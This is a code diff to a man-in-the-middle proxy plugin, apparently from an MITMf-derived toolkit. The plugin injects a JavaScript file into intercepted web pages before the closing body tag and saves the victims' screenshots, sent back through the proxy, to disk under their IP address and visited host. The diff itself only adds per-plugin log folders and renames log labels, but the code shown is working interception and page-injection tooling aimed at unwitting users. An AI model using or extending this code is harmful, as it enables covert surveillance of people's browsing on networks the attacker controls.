@@ -16,6 +16,7 @@
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
 
+import os
 from plugins.plugin import Plugin
 from libmproxy.protocol.http import decoded
 
@@ -33,7 +34,7 @@ Based on MITMf Screenshotter plugin: https://github.com/byt3bl33d3r/MITMf/
 
 class Screenshot(Plugin):
     name = 'Screenshot'
-    version = "1.0"
+    version = "1.1"
     replace_str = "</body>"
     content_path = "./content/Screenshot/screenshot.js"
     interval = 10
@@ -46,13 +47,17 @@ class Screenshot(Plugin):
             client = flow.client_conn.address()[0]
             img_file = '{}-{}-{}.png'.format(client, flow.request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
             try:
-                with open('./logs/' + img_file, 'wb') as img:
+                
+                if os.path.isdir("logs/" + self.name) == False:
+                    self.createDir("logs/" + self.name)
+                
+                with open('./logs/' + self.name + "/" + img_file, 'wb') as img:
                     img.write(base64.b64decode(urllib.unquote(flow.request.content).decode('utf8').split(',')[1]))
                     img.close()
 
-                logger.debug('[ScreenShotter] {} Saved screenshot to {}'.format(client, img_file))
+                logger.debug('['+self.name+'] {} Saved screenshot to {}'.format(client, img_file))
             except Exception as e:
-                logger.debug('[ScreenShotter] {} Error saving screenshot: {}'.format(client, e))        
+                logger.debug('['+self.name+'] {} Error saving screenshot: {}'.format(client, e))        
         
     def response(self, flow):
         with decoded(flow.response):
@@ -60,3 +65,8 @@ class Screenshot(Plugin):
             canvas = re.sub("SECONDS_GO_HERE", str(self.interval*1000), open(self.content_path, "rb").read())
             flow.response.content = flow.response.content.replace(self.replace_str, '<script type="text/javascript">' + canvas + '</script>' + self.replace_str)
             
+    def createDir(self, path):
+        try:
+            os.makedirs(path)
+        except OSError:
+            pass
